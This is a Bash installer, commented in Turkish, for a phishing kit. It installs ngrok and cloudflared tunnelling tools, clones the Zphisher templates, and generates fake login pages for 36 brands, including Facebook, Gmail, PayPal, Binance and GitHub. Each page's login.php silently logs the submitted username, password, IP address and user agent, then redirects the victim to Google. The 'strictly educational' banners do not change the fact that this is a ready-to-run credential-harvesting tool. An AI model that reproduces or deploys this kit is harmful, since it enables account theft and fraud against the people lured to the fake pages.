#!/bin/bash
# =============================================================================
# install.sh — Sıfır1Cio Kurulum Betiği
# =============================================================================
# KESİNLİKLE EĞİTİM AMAÇLIDIR
# =============================================================================
# Bu betik:
#   1) Sistem araçlarını kurar (git, curl, php, wget, ssh, tar, unzip)
#   2) Python kütüphanelerini kurar (requests, colorama, bs4, lxml,
#      pyngrok, psutil, tabulate, qrcode, Pillow)
#   3) Ngrok ve cloudflared'i kurar
#   4) Zphisher sites/ klasörünü git'ten klonlar
#   5) Fallback şablonları oluşturur
# =============================================================================

set -e

# Renkler
KIRMIZI='\033[0;31m'
YESIL='\033[0;32m'
SARI='\033[0;33m'
MAVI='\033[0;34m'
MOR='\033[0;35m'
CAMGOBEGI='\033[0;36m'
BEYAZ='\033[0;37m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CACHE_DIR="${SCRIPT_DIR}/.templates_cache"
SITES_DIR="${SCRIPT_DIR}/sites"
FALLBACK_DIR="${SCRIPT_DIR}/templates/fallback"
LOG_DIR="${SCRIPT_DIR}/logs"

# Zphisher repo
ZPHISHER_REPO="https://github.com/htr-tech/zphisher.git"
ZPHISHER_BRANCH="master"

banner() {
    clear
    echo -e "${CAMGOBEGI}"
    cat << "EOF"
     ███████╗██╗███████╗██╗██████╗ ██╗ ██████╗██╗ ██████╗ 
     ██╔════╝██║██╔════╝██║██╔══██╗██║██╔════╝██║██╔═══██╗
     ███████╗██║█████╗  ██║██████╔╝██║██║     ██║██║   ██║
     ╚════██║██║██╔══╝  ██║██╔══██╗██║██║     ██║██║   ██║
     ███████║██║██║     ██║██║  ██║██║╚██████╗██║╚██████╔╝
     ╚══════╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝ ╚═════╝ 
EOF
    echo -e "${NC}"
    echo -e "${KIRMIZI}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${KIRMIZI}║  KESİNLİKLE EĞİTİM AMAÇLIDIR                         ║${NC}"
    echo -e "${KIRMIZI}║  Bu araç yalnızca eğitim ve güvenlik araştırması     ║${NC}"
    echo -e "${KIRMIZI}║  amacıyla geliştirilmiştir.                          ║${NC}"
    echo -e "${KIRMIZI}╚══════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${SARI}              Sıfır1Cio Kurulum Betiği v3.0${NC}"
    echo -e "${MAVI}              ----------------------------------------${NC}"
    echo ""
}

log() {
    local tip="$1"
    shift
    local mesaj="$*"
    local zaman
    zaman=$(date '+%Y-%m-%d %H:%M:%S')

    mkdir -p "$LOG_DIR"
    echo "[$zaman] [$tip] $mesaj" >> "${LOG_DIR}/install.log"

    case "$tip" in
        "hata")   echo -e "${KIRMIZI}[!] $mesaj${NC}" ;;
        "basari") echo -e "${YESIL}[+] $mesaj${NC}" ;;
        "uyari")  echo -e "${SARI}[i] $mesaj${NC}" ;;
        *)        echo -e "${BEYAZ}[*] $mesaj${NC}" ;;
    esac
}

komut_var() {
    command -v "$1" &> /dev/null
}

sistem_tipi() {
    if [[ "$OSTYPE" == "darwin"* ]]; then
        echo "macos"
    elif [ -f /etc/debian_version ]; then
        echo "debian"
    elif [ -f /etc/arch-release ]; then
        echo "arch"
    elif [ -f /etc/redhat-release ] || [ -f /etc/fedora-release ]; then
        echo "redhat"
    else
        echo "bilinmiyor"
    fi
}

paket_kur() {
    local paket="$1"
    local sistem
    sistem=$(sistem_tipi)
    case "$sistem" in
        "debian") sudo apt update -qq && sudo apt install -y "$paket" ;;
        "arch")   sudo pacman -S --noconfirm "$paket" ;;
        "redhat") sudo dnf install -y "$paket" ;;
        "macos")  command -v brew &>/dev/null && brew install "$paket" ;;
        *) return 1 ;;
    esac
}

# =============================================================================
# ADIM 1: SİSTEM ARAÇLARI
# =============================================================================
adim_1_sistem() {
    log "baslik" "Adım 1/5: Sistem araçları kontrol ediliyor"
    echo ""

    local sistem
    sistem=$(sistem_tipi)

    local araclar=("git" "curl" "wget" "php" "ssh" "tar" "unzip")
    local paketler_debian=("git" "curl" "wget" "php-cli" "openssh-client" "tar" "unzip")
    local paketler_arch=("git" "curl" "wget" "php" "openssh" "tar" "unzip")
    local paketler_redhat=("git" "curl" "wget" "php-cli" "openssh-clients" "tar" "unzip")

    local eksikler=()
    local eksik_paketler=()

    for i in "${!araclar[@]}"; do
        local arac="${araclar[$i]}"
        if komut_var "$arac"; then
            log "basari" "$arac bulundu."
        else
            log "uyari" "$arac eksik."
            eksikler+=("$arac")
            case "$sistem" in
                "debian") eksik_paketler+=("${paketler_debian[$i]}") ;;
                "arch")   eksik_paketler+=("${paketler_arch[$i]}") ;;
                "redhat") eksik_paketler+=("${paketler_redhat[$i]}") ;;
            esac
        fi
    done

    if [ ${#eksikler[@]} -gt 0 ]; then
        echo ""
        log "info" "Eksik araçlar kuruluyor..."
        for paket in "${eksik_paketler[@]}"; do
            log "info" "$paket kuruluyor..."
            paket_kur "$paket" || log "hata" "$paket kurulamadı."
        done
    fi
}

# =============================================================================
# ADIM 2: PYTHON KÜTÜPHANELERİ
# =============================================================================
adim_2_python() {
    log "baslik" "Adım 2/5: Python kütüphaneleri kontrol ediliyor"
    echo ""

    local sistem
    sistem=$(sistem_tipi)

    local kutuphaneler=(
        "requests:requests:python3-requests:zorunlu"
        "colorama:colorama:python3-colorama:opsiyonel"
        "beautifulsoup4:bs4:python3-bs4:opsiyonel"
        "lxml:lxml:python3-lxml:opsiyonel"
        "pyngrok:pyngrok:python3-pyngrok:opsiyonel"
        "psutil:psutil:python3-psutil:opsiyonel"
        "tabulate:tabulate:python3-tabulate:opsiyonel"
        "qrcode:qrcode:python3-qrcode:opsiyonel"
        "Pillow:PIL:python3-pil:opsiyonel"
    )

    for satir in "${kutuphaneler[@]}"; do
        IFS=':' read -r paket import_adi apt_adi zorunlu <<< "$satir"

        if python3 -c "import $import_adi" 2>/dev/null; then
            log "basari" "$paket yüklü."
        else
            log "uyari" "$paket eksik, kuruluyor..."

            # Önce pip dene (PEP 668 uyumlu)
            if python3 -m pip install --break-system-packages --quiet "$paket" 2>/dev/null; then
                log "basari" "$paket kuruldu (pip)."
            # apt dene
            elif paket_kur "$apt_adi"; then
                log "basari" "$paket kuruldu (apt)."
            else
                if [ "$zorunlu" = "zorunlu" ]; then
                    log "hata" "$paket kurulamadı (ZORUNLU)!"
                else
                    log "uyari" "$paket kurulamadı (opsiyonel)."
                fi
            fi
        fi
    done
}

# =============================================================================
# ADIM 3: TÜNEL SERVİSLERİ
# =============================================================================
adim_3_tunel() {
    log "baslik" "Adım 3/5: Tünel servisleri kontrol ediliyor"
    echo ""

    local mim
    mim=$(uname -m)
    local ngrok_url=""
    local cloudflared_url=""

    case "$mim" in
        x86_64)  ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
                 cloudflared_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        aarch64|arm64) ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
                 cloudflared_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        armv7l)  ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz"
                 cloudflared_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        *)       ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
                 cloudflared_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
    esac

    # Ngrok
    if komut_var ngrok; then
        log "basari" "ngrok bulundu."
    else
        log "uyari" "ngrok kuruluyor..."
        wget -q "$ngrok_url" -O /tmp/ngrok.tgz && \
            sudo tar xzf /tmp/ngrok.tgz -C /usr/local/bin/ && \
            sudo chmod +x /usr/local/bin/ngrok && \
            rm -f /tmp/ngrok.tgz && \
            log "basari" "ngrok kuruldu." || log "hata" "ngrok kurulamadı."
    fi

    # Cloudflared
    if komut_var cloudflared; then
        log "basari" "cloudflared bulundu."
    else
        log "uyari" "cloudflared kuruluyor..."
        wget -q "$cloudflared_url" -O /tmp/cloudflared && \
            sudo mv /tmp/cloudflared /usr/local/bin/cloudflared && \
            sudo chmod +x /usr/local/bin/cloudflared && \
            log "basari" "cloudflared kuruldu." || log "hata" "cloudflared kurulamadı."
    fi
}

# =============================================================================
# ADIM 4: ZPHISHER ŞABLONLARINI KLONLA
# =============================================================================
adim_4_sablonlar() {
    log "baslik" "Adım 4/5: Şablonlar hazırlanıyor"
    echo ""

    if [ -d "${CACHE_DIR}/.github/pages" ] && [ "$(ls -A ${CACHE_DIR}/.github/pages 2>/dev/null)" ]; then
        log "basari" "Şablonlar zaten mevcut."
        return 0
    fi

    # Eski cache varsa temizle
    [ -d "$CACHE_DIR" ] && rm -rf "$CACHE_DIR"

    log "info" "Şablonlar çekiliyor..."
    if git clone --depth=1 --branch "$ZPHISHER_BRANCH" "$ZPHISHER_REPO" "$CACHE_DIR" 2>/dev/null; then
        if [ -d "${CACHE_DIR}/.github/pages" ]; then
            log "basari" "Şablonlar hazır."
            return 0
        fi
    fi

    log "uyari" "Git başarısız, arşiv indiriliyor..."

    local arsiv_url="https://github.com/htr-tech/zphisher/archive/refs/heads/${ZPHISHER_BRANCH}.zip"
    if wget -q "$arsiv_url" -O /tmp/zphisher.zip; then
        if unzip -q /tmp/zphisher.zip -d /tmp/ 2>/dev/null; then
            mv "/tmp/zphisher-${ZPHISHER_BRANCH}" "$CACHE_DIR" 2>/dev/null || true
            rm -f /tmp/zphisher.zip
            if [ -d "${CACHE_DIR}/.github/pages" ]; then
                log "basari" "Şablonlar hazır (arşivden)."
                return 0
            fi
        fi
    fi

    log "uyari" "Şablonlar çekilemedi, fallback kullanılacak."
    return 0
}

# =============================================================================
# ADIM 5: FALLBACK ŞABLONLAR
# =============================================================================
adim_5_fallback() {
    log "baslik" "Adım 5/5: Fallback şablonlar oluşturuluyor"
    echo ""

    mkdir -p "$FALLBACK_DIR"

    local siteler=(
        facebook instagram twitter tiktok snapchat linkedin reddit pinterest
        gmail yahoo outlook protonmail steam playstation xbox epicgames roblox
        minecraft paypal stripe binance coinbase netflix spotify github discord
        microsoft apple amazon wordpress origin adobe dropbox gitlab twitch
    )

    for site in "${siteler[@]}"; do
        local hedef="${FALLBACK_DIR}/${site}"
        mkdir -p "$hedef/images" "$hedef/logs"
        touch "${hedef}/logs/log.txt"

        # index.html
        cat > "${hedef}/index.html" << HTMLEOF
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${site} • Giriş Yap</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
<div class="logo">
<img src="images/logo.png" alt="${site}" onerror="this.style.display='none'">
<span class="yazi">${site}</span>
</div>
<form method="POST" action="login.php">
<input type="text" name="username" placeholder="E-posta veya kullanıcı adı" required>
<input type="password" name="password" placeholder="Şifre" required>
<button type="submit">Giriş Yap</button>
</form>
<div class="alt-link"><a href="#">Şifreni mi unuttun?</a></div>
<div class="cizgi"><span>VEYA</span></div>
<div class="alt-link"><a href="#">Yeni Hesap Oluştur</a></div>
</div>
<div class="uyari">KESİNLİKLE EĞİTİM AMAÇLIDIR</div>
</body>
</html>
HTMLEOF

        # style.css
        cat > "${hedef}/style.css" << CSSEOF
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
body{background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.container{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:40px;width:100%;max-width:400px;text-align:center}
.logo{margin-bottom:28px;display:flex;align-items:center;justify-content:center;gap:10px}
.logo img{width:44px;height:44px;border-radius:8px}
.logo .yazi{font-size:26px;font-weight:700;color:#1a1a1a;text-transform:capitalize}
input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;background:#fff}
input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
button{width:100%;padding:12px;margin-top:6px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-weight:700;font-size:17px;cursor:pointer}
button:hover{background:#166fe5}
.alt-link{display:block;margin-top:16px;font-size:14px}
.alt-link a{color:#1877f2;text-decoration:none}
.alt-link a:hover{text-decoration:underline}
.cizgi{display:flex;align-items:center;margin:20px 0}
.cizgi::before,.cizgi::after{content:"";flex:1;height:1px;background:#dadde1}
.cizgi span{margin:0 16px;color:#96999e;font-size:13px}
.uyari{margin-top:20px;color:#c00;font-size:11px;font-weight:700;letter-spacing:1px}
CSSEOF

        # login.php
        cat > "${hedef}/login.php" << 'PHPEOF'
<?php
// KESİNLİKLE EĞİTİM AMAÇLIDIR
$ip = $_SERVER['REMOTE_ADDR'] ?? 'bilinmiyor';
$tarih = date('Y-m-d H:i:s');
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'bilinmiyor';
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

$log = "════════════════════════════════════════\n";
$log .= "Tarih: $tarih\n";
$log .= "IP: $ip\n";
$log .= "Metod: $method\n";
$log .= "User-Agent: $ua\n";
$log .= "--- Veriler ---\n";

foreach ($_POST as $k => $v) {
    $log .= "$k: $v\n";
}
$log .= "════════════════════════════════════════\n\n";

@file_put_contents(__DIR__ . '/logs/log.txt', $log, FILE_APPEND);

header("Location: https://www.google.com");
exit;
?>
PHPEOF
    done

    log "basari" "${#siteler[@]} fallback şablon hazır."
}

# =============================================================================
# ANA
# =============================================================================
main() {
    banner

    adim_1_sistem
    echo ""
    adim_2_python
    echo ""
    adim_3_tunel
    echo ""
    adim_4_sablonlar
    echo ""
    adim_5_fallback
    echo ""

    # config.json
    cat > "${SCRIPT_DIR}/config.json" << JSONEOF
{
  "kurulum_tarihi": "$(date '+%Y-%m-%d %H:%M:%S')",
  "versiyon": "3.0",
  "cache_dir": "${CACHE_DIR}",
  "sites_dir": "${SITES_DIR}",
  "fallback_dir": "${FALLBACK_DIR}"
}
JSONEOF

    echo -e "${YESIL}Kurulum tamamlandı!${NC}"
    echo ""
    echo -e "${SARI}Şimdi çalıştır:${NC}"
    echo -e "  ${BEYAZ}python3 pyphisher.py${NC}"
    echo ""
}

main
